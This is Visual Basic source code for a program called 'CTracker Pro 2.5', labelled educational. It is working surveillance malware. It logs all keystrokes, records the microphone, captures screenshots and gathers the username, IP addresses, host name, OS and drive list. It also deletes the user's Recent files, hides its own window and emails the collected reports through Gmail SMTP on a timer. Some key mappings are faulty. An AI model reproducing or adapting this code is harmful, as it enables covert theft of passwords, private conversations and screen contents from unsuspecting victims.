'﻿'Copyright 2010 Elliot M - Developer and security researcher.
''For educational purposes only. Do not use or reproduce without the explicit written consent from the original owner.

Imports System.Net.Mail
Imports System.IO

Public Class CTracker
    Dim o1 As String
    Dim o2 As String
    Dim o3 As String = "smtp.gmail.com"
    Dim imag1 As String
    Dim imag2 As String
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Dim mail As New MailMessage()

    Public Function CapsLock() As Boolean
        CapsLock = CBool(GetKeyState(System.Windows.Forms.Keys.Capital) And 1)
    End Function

    Public Function Shift() As Boolean
        Shift = CBool(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
    End Function

    Private Sub CTracker_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If My.Settings.Email <> "default" AndAlso My.Settings.Password <> "default" AndAlso My.Settings.IDNumber <> "default" Then
            o1 = My.Settings.Email
            o2 = My.Settings.Password
        Else
            Close()
        End If
        mciSendString("open new Type waveaudio Alias audio", "", 0, 0)
        mciSendString("record audio", "", 0, 0)
        Dim mins As String
        mins = My.Computer.Clock.TickCount.ToString / 1000 / 60
        TextBox1.Text = Environment.UserName.ToString
        TextBox2.Text = mins + " " + "Minutes"
        TextBox3.Text = My.Computer.Clock.LocalTime.ToString
        TextBox4.Text = vbNewLine + Now.ToString + ": "
        Try
            Dim WAN1 As New System.Net.WebClient
            TextBox5.Text = System.Text.Encoding.ASCII.GetString((WAN1.DownloadData("http://www.futuretechnologiespr.com/services/ipaddress.php")))
            WAN1.Dispose()
        Catch ex As Exception
            TextBox5.Text = "SERVICE UNAVAILABLE"
        End Try
        Dim Host As String = System.Net.Dns.GetHostName
        Dim IPs As System.Net.IPHostEntry = System.Net.Dns.GetHostEntry(Host)
        TextBox7.Text = IPs.HostName.ToString
        For Each IP As System.Net.IPAddress In IPs.AddressList
            TextBox6.Text += IP.ToString + " "
        Next
        TextBox8.Text = My.Computer.Info.OSFullName.ToString
        For i2 As Integer = 0 To Environment.GetLogicalDrives.Length - 1
            TextBox9.Text += Environment.GetLogicalDrives(i2) + " "
        Next
        Dim i3 As String
        For Each i3 In System.IO.Directory.GetFiles("C:\Users\" + TextBox1.Text + "\AppData\Roaming\Microsoft\Windows\Recent")
            System.IO.File.Delete(i3)
        Next
        If System.IO.File.Exists("data_000") Then
            System.IO.File.Delete("data_000")
        End If
    End Sub

    Private Sub KeyT_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeyT.Tick
        Dim i As Object
        Dim KeysPressed As Object
        Dim Count As Int32
        Dim Limit As Int32 = 69
        Dim Add As Object
        KeysPressed = GetAsyncKeyState(13)
        If KeysPressed = -32767 Then
            Count = 0
            Add = vbNewLine + Now.ToString + ": "
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(8)
        If KeysPressed = -32767 Then
            Add = "[Backspace]"
            Count += 4
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(32)
        If KeysPressed = -32767 Then
            Add = "[Space]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(9)
        If KeysPressed = -32767 Then
            Add = "[Tab]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(17)
        If KeysPressed = -32767 Then
            Add = "[Ctrl]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(18)
        If KeysPressed = -32767 Then
            Add = "[Alt]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(20)
        If KeysPressed = -32767 Then
            Add = "[Caps Lock]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(27)
        If KeysPressed = -32767 Then
            Add = "[Esc]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(37)
        If KeysPressed = -32767 Then
            Add = "[Left]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(38)
        If KeysPressed = -32767 Then
            Add = "[Up]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(39)
        If KeysPressed = -32767 Then
            Add = "[Right]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(40)
        If KeysPressed = -32767 Then
            Add = "[Down]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(46)
        If KeysPressed = -32767 Then
            Add = "[Delete]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(186)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = ";"
            Else
                Add = ":"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(187)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "="
            Else
                Add = "+"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(188)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = ","
            Else
                Add = "<"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(189)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "-"
            Else
                Add = "_"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(190)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "."
            Else
                Add = ">"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(191)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "/"
            Else
                Add = "?"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(192)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "`"
            Else
                Add = "~"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(96)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "0"
            Else
                Add = ")"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(97)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "1"
            Else
                Add = "!"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(98)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "2"
            Else
                Add = "@"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(99)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "3"
            Else
                Add = "#"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(100)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "4"
            Else
                Add = "$"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(101)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "5"
            Else
                Add = "%"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(102)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "6"
            Else
                Add = "7"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(103)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "7"
            Else
                Add = "&"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(104)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "8"
            Else
                Add = "*"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(105)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "9"
            Else
                Add = "("
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(106)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "*"
                Count += 1
            Else
                Add = ""
            End If
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(107)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "+"
            Else
                Add = "="
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(108)
        If KeysPressed = -32767 Then
            Add = " "
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(109)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "-"
            Else
                Add = "_"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(110)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "."
            Else
                Add = ">"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(106)
        If KeysPressed = -32767 Then
            Add = "[Multiply]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(107)
        If KeysPressed = -32767 Then
            Add = "[Add]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(109)
        If KeysPressed = -32767 Then
            Add = "[Subtract]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(111)
        If KeysPressed = -32767 Then
            Add = "/"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(2)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "/"
            Else
                Add = "?"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(220)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "\"
            Else
                Add = "|"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(222)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "'"
            Else
                Add = Chr(34)
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(221)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "]"
            Else
                Add = "}"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(219)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "["
            Else
                Add = "{"
            End If
            GoTo KeyFound
            Count += 1
        End If
        For i = 65 To 128
            KeysPressed = GetAsyncKeyState(i)
            If KeysPressed = -32767 Then
                If Shift() = False Then
                    If CapsLock() = True Then
                        Add = UCase(Chr(i))
                    Else
                        Add = LCase(Chr(i))
                    End If
                Else
                    If CapsLock() = False Then
                        Add = UCase(Chr(i))
                    Else
                        Add = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                Count += 1
            End If
        Next i
        For i = 48 To 57
            KeysPressed = GetAsyncKeyState(i)
            If KeysPressed = -32767 Then
                If Shift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            Add = "!"
                        Case 2
                            Add = "@"
                        Case 3
                            Add = "#"
                        Case 4
                            Add = "$"
                        Case 5
                            Add = "%"
                        Case 6
                            Add = "^"
                        Case 7
                            Add = "&"
                        Case 8
                            Add = "*"
                        Case 9
                            Add = "("
                        Case 0
                            Add = ")"
                    End Select
                Else
                    Add = Chr(i)
                End If
                GoTo KeyFound
                Count += 1
            End If
        Next i
KeyFound:
        If Count > Limit Then
            Count = 0
            TextBox4.AppendText(vbCrLf)
        End If
        If Add <> "" Then TextBox4.AppendText(Add)
    End Sub

    Private Sub SendT_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendT.Tick
        mciSendString("save audio sound.wav", "", 0, 0)
        mciSendString("close audio", "", 0, 0)
        Dim time As String = Now.Year.ToString + Now.Month.ToString + Now.Day.ToString + Now.Hour.ToString + Now.Minute.ToString
        Dim Dir As New IO.DirectoryInfo("C:\Users\" + TextBox1.Text + "\AppData\Roaming\Microsoft\Windows\Recent")
        Dim Dir1 As IO.FileInfo() = Dir.GetFiles()
        Dim Dir2 As IO.FileInfo
        For Each Dir2 In Dir1
            ListBox1.Items.Add(System.IO.Path.GetFileNameWithoutExtension(Dir2.ToString))
        Next
        ListBox1.Items.Remove("desktop")
        Dim Writer1 As StreamWriter = New StreamWriter(time + " - " + "LOG" + ".txt")
        Writer1.WriteLine(Label1.Text + TextBox1.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label2.Text + TextBox2.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label3.Text + TextBox3.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label4.Text + TextBox4.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label5.Text + TextBox5.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label6.Text + TextBox6.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label7.Text + TextBox7.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label8.Text + TextBox8.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label9.Text + TextBox9.Text)
        Writer1.WriteLine("")
        Writer1.WriteLine(Label10.Text)
        Writer1.WriteLine("")
        Dim i1 As Integer
        For i1 = 0 To ListBox1.Items.Count - 1
            Writer1.WriteLine(ListBox1.Items.Item(i1))
        Next
        Writer1.Close()
        Dim imgtime As String = Now.Year.ToString + Now.Month.ToString + Now.Day.ToString + Now.Hour.ToString + Now.Minute.ToString
        Dim ScreenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim BMP3 As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim IMG3 As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(BMP3)
        IMG3.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
        BMP3.Save(imgtime + " - " + "DISPLAY" + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
        ListBox1.Items.Clear()
        My.Computer.FileSystem.RenameFile("sound.wav", time + " - " + "MICROPHONE" + ".wav")
        Dim client As New SmtpClient()
        Dim sendTo As New MailAddress(o1)
        Dim from As MailAddress = New MailAddress(o1, "CTracker Pro 2.5 | Report")
        Dim message As New MailMessage(from, sendTo)
        Dim attach1 As New System.Net.Mail.Attachment(time + " - " + "LOG" + ".txt")
        Dim attach2 As New System.Net.Mail.Attachment(imag1)
        Dim attach3 As New System.Net.Mail.Attachment(imag2)
        Dim attach4 As New System.Net.Mail.Attachment(imgtime + " - " + "DISPLAY" + ".jpg")
        Dim attach5 As New System.Net.Mail.Attachment(time + " - " + "MICROPHONE" + ".wav")
        message.IsBodyHtml = True
        message.Subject = "CTracker Pro 2.5 | automated computer surveillance L2 | Report" + " - " + Now.ToString
        message.Body = "Open attached files to view content. " + "Report Time: " + Now.ToString
        message.Attachments.Add(attach1)
        message.Attachments.Add(attach2)
        message.Attachments.Add(attach3)
        message.Attachments.Add(attach4)
        message.Attachments.Add(attach5)
        Dim basicAuthentication As New System.Net.NetworkCredential(o1, o2)
        client.Host = o3
        client.UseDefaultCredentials = False
        client.Credentials = basicAuthentication
        client.EnableSsl = True
        client.Port = 587
        Try
            client.Send(message)
        Catch ex As Exception
            message.Dispose()
        End Try
        mciSendString("open new Type waveaudio Alias audio", "", 0, 0)
        mciSendString("record audio", "", 0, 0)
        Dim mins As String
        mins = My.Computer.Clock.TickCount.ToString / 1000 / 60
        TextBox2.Text = String.Empty
        TextBox3.Text = String.Empty
        TextBox4.Text = String.Empty
        TextBox5.Text = String.Empty
        TextBox2.Text = mins + " " + "Minutes"
        TextBox3.Text = My.Computer.Clock.LocalTime.ToString
        TextBox4.Text = vbNewLine + Now.ToString + ": "
        Try
            Dim WAN As New System.Net.WebClient
            TextBox5.Text = System.Text.Encoding.ASCII.GetString((WAN.DownloadData("http://www.futuretechnologiespr.com/services/ipaddress.php")))
            WAN.Dispose()
        Catch ex As Exception
            TextBox5.Text = "SERVICE UNAVAILABLE"
        End Try
        Dim NetworkInterfaces() As System.Net.NetworkInformation.NetworkInterface = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
        TextBox9.Text = String.Empty
        For i2 As Integer = 0 To Environment.GetLogicalDrives.Length - 1
            TextBox9.Text += Environment.GetLogicalDrives(i2) + " "
        Next
        Img1T.Enabled = True
        Img2T.Enabled = True
        SendT.Enabled = False
        SendT.Interval = "120000"
    End Sub

    Private Sub BlockT_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlockT.Tick
        Visible = False
        Hide()
    End Sub

    Private Sub Img1T_Tick(sender As Object, e As EventArgs) Handles Img1T.Tick
        SendT.Enabled = True
        Dim time1 As String = Now.Year.ToString + Now.Month.ToString + Now.Day.ToString + Now.Hour.ToString + Now.Minute.ToString
        Dim image1 As String = time1 + " - " + "DISPLAY" + ".jpg"
        Dim ScreenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim BMP1 As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim IMG1 As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(BMP1)
        IMG1.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
        BMP1.Save(image1, System.Drawing.Imaging.ImageFormat.Jpeg)
        imag1 = image1
        Img1T.Enabled = False
    End Sub

    Private Sub Img2T_Tick(sender As Object, e As EventArgs) Handles Img2T.Tick
        SendT.Enabled = True
        Dim time2 As String = Now.Year.ToString + Now.Month.ToString + Now.Day.ToString + Now.Hour.ToString + Now.Minute.ToString
        Dim image2 As String = time2 + " - " + "DISPLAY" + ".jpg"
        Dim ScreenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim BMP2 As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Dim IMG2 As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(BMP2)
        IMG2.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
        BMP2.Save(image2, System.Drawing.Imaging.ImageFormat.Jpeg)
        imag2 = image2
        Img2T.Enabled = False
    End Sub

End Class